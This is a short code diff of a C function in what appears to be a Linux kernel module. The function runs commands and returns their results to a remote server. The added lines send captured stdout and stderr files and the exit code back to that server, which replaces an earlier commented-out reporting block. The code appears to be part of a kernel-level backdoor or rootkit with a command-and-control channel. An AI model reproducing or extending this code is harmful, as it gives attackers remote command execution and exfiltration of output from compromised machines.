@@ -103,27 +103,12 @@ int exec_handler(char *args) {
 		return ret_code;
 	}
 
-	// Send the result back to the server
-	// unsigned result_size = 2 * STD_BUFFER_SIZE + 50;	// Adjust size for output and error messages
-	// 													// +50 for the message format
-	// char *result_msg = kmalloc(result_size, GFP_KERNEL);
-	// if (!result_msg) {
-	// 	ERR_MSG("exec_handler: failed to allocate memory for result message\n");
-	// 	return -ENOMEM;
-	// }
-
-	// snprintf(result_msg, 
-	// 			result_size, 
-	// 			"execution result:\nstdout:\n%s\nstderr:\n%s\nterminated with code %d\n", 
-	// 			exec_result.std_out, exec_result.std_err, exec_result.code);
-
-	// ret_code = send_to_server(result_msg);
-	// if (ret_code != SUCCESS) {
-	// 	ERR_MSG("exec_handler: failed to send result message\n");
-	// }
-	// DBG_MSG("exec_handler: command result sent\n");
-
-	// kfree(result_msg);
+	// Send the result to the server
+	send_to_server("stdout:\n");
+	send_file_to_server(STDOUT_FILE);
+	send_to_server("stderr:\n");
+	send_file_to_server(STDERR_FILE);
+	send_to_server("terminated with code %d\n", exec_result.code);
 
 	return ret_code;
 }
